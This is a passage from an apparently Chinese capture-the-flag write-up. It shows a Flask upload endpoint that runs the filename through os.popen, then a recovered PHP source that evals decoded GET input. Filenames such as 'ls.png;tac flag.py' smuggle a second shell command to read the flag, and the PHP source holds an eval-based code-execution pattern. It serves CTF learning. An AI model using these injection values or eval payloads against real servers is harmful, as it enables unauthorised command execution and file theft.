<span class="line"><span style="color:#d4d4d4">            cmd=</span><span style="color:#ce9178">"python3 tsteg.py upload/"</span><span style="color:#d4d4d4">+f.filename</span></span>
<span class="line"><span style="color:#d4d4d4">            result=os.popen(cmd).read()</span></span>
<span class="line"><span style="color:#d4d4d4">            data={</span><span style="color:#ce9178">"code"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"cmd"</span><span style="color:#d4d4d4">:cmd,</span><span style="color:#ce9178">"result"</span><span style="color:#d4d4d4">:result,</span><span style="color:#ce9178">"message"</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"file uploaded!"</span><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> jsonify(data)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">except</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            data={</span><span style="color:#ce9178">"code"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"message"</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"file upload error!"</span><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> jsonify(data)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> render_template(</span><span style="color:#ce9178">'upload.html'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#dcdcaa">@app.route</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'/source'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">methods</span><span style="color:#d4d4d4">=[</span><span style="color:#ce9178">'GET'</span><span style="color:#d4d4d4">])</span></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">show_source</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> render_template(</span><span style="color:#ce9178">'source.html'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">__name__</span><span style="color:#d4d4d4"> == </span><span style="color:#ce9178">'__main__'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">    app.run(</span><span style="color:#9cdcfe">host</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'0.0.0.0'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">port</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">80</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">debug</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">False</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>这里主要是这段：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">cmd=</span><span style="color:#ce9178">"python3 tsteg.py upload/"</span><span style="color:#d4d4d4">+f.filename</span></span>
<span class="line"><span style="color:#d4d4d4">result=os.popen(cmd).read()</span></span></code></pre></div></div></figure><p>可以看出，cmd 作为参数被执行命令，而且 filename 是直接拼接的，没有任何过滤。</p><p>还要知道个冷知识就是：python 中，同一行使用分号并不表示程序在那一行截止，而表示分隔，它允许在同一行中编写多个语句。</p><p>于是可以抓包改文件名用分号进行命令注入：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ls</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">png;ls</span></span></code></pre></div></div></figure><p>得到当前目录：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252118445.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125211834340"></p><p>尝试 tac：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ls</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">png;tac flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">py</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252119437.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125211951341"></p><h3 id="is_not_obfuscate"><a class="markdownIt-Anchor" href="#is_not_obfuscate"></a> Is_Not_Obfuscate</h3><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252123050.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125212302955"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252122568.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125212248475"></p><p>尝试下载 robots：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">User-agent: *</span></span>
<span class="line"><span style="color:#d4d4d4">Allow: /lib</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php$</span></span>
<span class="line"><span style="color:#d4d4d4">Disallow: /lib</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php?flag=</span><span style="color:#b5cea8">0</span></span>
<span class="line"><span style="color:#d4d4d4">Disallow: /plugins</span></span></code></pre></div></div></figure><p>测试 /lib.php?flag=0 并没有回显是空的，尝试别的值得到类似 base64 的代码：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI/w3p1+/wX69euqzpVDJ2a/GkWO4z4QQpnTUq9P5fFd3Uu+YvM2ht+ZXSvYiLXq0o8zaUZ/KSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K+WAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr+NHn6Jn3MYCnm/z9GbI9TH0XZfPPoqqZRrKo48Gdz+odPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI+CLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg/EmgnR+x6othXTZ2ZGQsEYvRa/U1LaK/4D7Op3ZKrKFnzAs01qSCbbf+P097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ+DU5vzz0+doHA+3opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw+F7BHMJPheaGD3faUo71nCiV6QWQu0VW/O2DvG+eubaq5t1a5Y3tYJmti6soht26kuF7jUUg+vZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9+kQvcSUbuwuEnWHYzn16/ewTo+gVIqv0+DNJC0YUGs9kWnS2+1sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ/r2muD0WE4G5qRRQ8dnmkgxTVF7Zh61/yvmis14AVf3UwjoHywgVs7MNevg/tCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY+MB7L5c4S+5arvpFKn/GN4KvCEWYZ+r7inzI+ng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E+fPm6bO7/jSe+2SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp/SzwQLyo5N5HVZEVzMdqY7RiEqT6/FOLji7N/7E3c+8ZLOGGQcDJMM5FARuDOfYyh09+M+I1Hdc+bCze4S0TuOa3j7orHPzP/BLQQLKt6c4cLZ42QbgJwmpowDmVjo/R6dyCuJbWwKGS8BVtzxfh2YhYu+r1n7mrY7nPTxszI6w/TWAErJEBVZwXlj33RDqfi+u45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP/9+w8pT7oT</span></span></code></pre></div></div></figure><p>联想到题目要咱们输入加密代码，并且源代码中注释给出一个 button 则进行修改：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252140645.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125214003543"></p><p>得到代码：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">Anything is good?Please test it</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Content-Type:text/html;charset=utf-8"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'lib.php'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">is_dir</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'./plugins/'</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    @</span><span style="color:#dcdcaa">mkdir</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'./plugins/'</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0777</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#6a9955">//Test it and delete it ！！！</span></span>
<span class="line"><span style="color:#6a9955">//测试执行加密后的插件代码</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'action'</span><span style="color:#d4d4d4">] === </span><span style="color:#ce9178">'test'</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'Anything is good?Please test it.'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">decode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'input'</span><span style="color:#d4d4d4">]));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">ini_set</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'open_basedir'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'./plugins/'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">empty</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'action'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">switch</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'action'</span><span style="color:#d4d4d4">]){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">case</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'pull'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$output</span><span style="color:#d4d4d4"> = @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">decode</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'./plugins/'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'input'</span><span style="color:#d4d4d4">])));</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"pull success"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">break</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">case</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'push'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$input</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'./plugins/'</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'output'</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'youyou'</span><span style="color:#d4d4d4">), </span><span style="color:#dcdcaa">encode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'output'</span><span style="color:#d4d4d4">]));</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"push success"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">break</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">default</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;!doctype html&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;head&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;meta http-equiv=</span><span style="color:#ce9178">"Content-Type"</span><span style="color:#d4d4d4"> content=</span><span style="color:#ce9178">"text/html; charset=utf-8"</span><span style="color:#d4d4d4"> /&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;title&gt;Push or </span><span style="color:#dcdcaa">Pull</span><span style="color:#d4d4d4"> (最好用的开源插件社区)&lt;/title&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/head&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;style&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">main {</span></span>
<span class="line"><span style="color:#d4d4d4">        max-width: </span><span style="color:#b5cea8">950</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        padding: </span><span style="color:#b5cea8">19</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        margin: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> auto </span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        background-color: </span><span style="color:#6a9955">#c9c4c4;</span></span>
<span class="line"><span style="color:#d4d4d4">        border: </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px solid </span><span style="color:#6a9955">#e0dbdb;</span></span>
<span class="line"><span style="color:#d4d4d4">        -webkit-border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        -moz-border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        -webkit-box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        -moz-box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    small {</span></span>
<span class="line"><span style="color:#d4d4d4">        color: </span><span style="color:#6a9955">#777;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">ml6 {</span></span>
<span class="line"><span style="color:#d4d4d4">        margin-left: </span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">help {</span></span>
<span class="line"><span style="color:#d4d4d4">        max-width: </span><span style="color:#b5cea8">950</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        padding: </span><span style="color:#b5cea8">19</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">29</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        margin: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> auto </span><span style="color:#b5cea8">20</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        background-color: </span><span style="color:#6a9955">#92e8c0;</span></span>
<span class="line"><span style="color:#d4d4d4">        border: </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px solid </span><span style="color:#6a9955">#99e169;</span></span>
<span class="line"><span style="color:#d4d4d4">        -webkit-border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        -moz-border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        border-radius: </span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">px;</span></span>
<span class="line"><span style="color:#d4d4d4">        -webkit-box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        -moz-box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        box-shadow: </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">px </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">px </span><span style="color:#dcdcaa">rgba</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">.05</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/style&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;div </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"main"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;h3&gt;Push or Pull&lt;small </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"ml6"</span><span style="color:#d4d4d4">&gt;(最好用的开源插件社区)&lt;/small&gt;&lt;/h3&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;form method=</span><span style="color:#ce9178">"get"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;textarea name=</span><span style="color:#ce9178">"input"</span><span style="color:#d4d4d4"> cols=</span><span style="color:#ce9178">"80"</span><span style="color:#d4d4d4"> rows=</span><span style="color:#ce9178">"6"</span><span style="color:#d4d4d4"> placeholder=</span><span style="color:#ce9178">"输入需要预览的插件名称"</span><span style="color:#d4d4d4">&gt;&lt;/textarea&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;</span><span style="color:#569cd6">br</span><span style="color:#d4d4d4"> /&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;!-- </span><span style="color:#6a9955">//测试执行加密后的插件代码 </span></span>
<span class="line"><span style="color:#d4d4d4">       </span><span style="color:#6a9955">//这里只能执行加密代码，非加密代码不能执行</span></span>
<span class="line"><span style="color:#d4d4d4">      </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">decode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'input'</span><span style="color:#d4d4d4">])); --&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;!-- &lt;button name=</span><span style="color:#ce9178">"action"</span><span style="color:#d4d4d4"> value=</span><span style="color:#ce9178">"test"</span><span style="color:#d4d4d4">&gt; </span><span style="color:#dcdcaa">执行</span><span style="color:#d4d4d4"> (</span><span style="color:#c586c0">do</span><span style="color:#d4d4d4">)&lt;/button&gt;--&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;button name=</span><span style="color:#ce9178">"action"</span><span style="color:#d4d4d4"> value=</span><span style="color:#ce9178">"pull"</span><span style="color:#d4d4d4">&gt; </span><span style="color:#dcdcaa">预览</span><span style="color:#d4d4d4"> (pull)&lt;/button&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;button name=</span><span style="color:#ce9178">"action"</span><span style="color:#d4d4d4"> value=</span><span style="color:#ce9178">"push"</span><span style="color:#d4d4d4">&gt;</span><span style="color:#dcdcaa">贡献</span><span style="color:#d4d4d4"> (push)&lt;/button&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;</span><span style="color:#569cd6">br</span><span style="color:#d4d4d4"> /&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;textarea name=</span><span style="color:#ce9178">"output"</span><span style="color:#d4d4d4"> cols=</span><span style="color:#ce9178">"80"</span><span style="color:#d4d4d4"> rows=</span><span style="color:#ce9178">"6"</span><span style="color:#d4d4d4"> placeholder=</span><span style="color:#ce9178">"&lt;?php @eval(</span><span style="color:#9cdcfe">$output</span><span style="color:#ce9178">);?&gt;"</span><span style="color:#d4d4d4">&gt;&lt;/textarea&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;/form&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;div </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"help"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        &lt;p&gt;您可以免费预览插件的源码与执行效果，也可以购买我们998</span><span style="color:#9cdcfe">$的解密器进行二次开发。</span><span style="color:#d4d4d4">&lt;/p&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        &lt;p&gt;您可以贡献代码给我们，我们可能会采纳，届时将提供奖励&lt;/p&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;/div&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;/div&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;!-- Test the lib</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php before </span><span style="color:#569cd6">use</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">the</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">index</span><span style="color:#d4d4d4">.</span><span style="color:#4ec9b0">php！</span><span style="color:#d4d4d4">--&gt;</span></span>
